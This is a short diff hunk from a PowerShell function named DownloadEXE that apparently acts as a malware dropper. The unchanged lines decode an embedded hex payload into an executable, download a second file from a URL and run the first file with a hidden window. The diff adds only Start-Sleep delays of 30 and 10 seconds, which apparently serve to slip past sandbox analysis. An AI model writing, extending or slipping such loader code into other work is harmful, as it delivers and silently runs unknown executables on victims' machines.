@@ -9,9 +9,9 @@ function DownloadEXE {
     }
 	$bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
 	[System.IO.File]::WriteAllBytes($outFile, $bytes)
-
+	Start-Sleep -Seconds 30
 	Invoke-WebRequest -Uri $Url -OutFile $outFile2
-	
+	Start-Sleep -Seconds 10
     Start-Process -FilePath $outFile -WindowStyle Hidden
 }
 
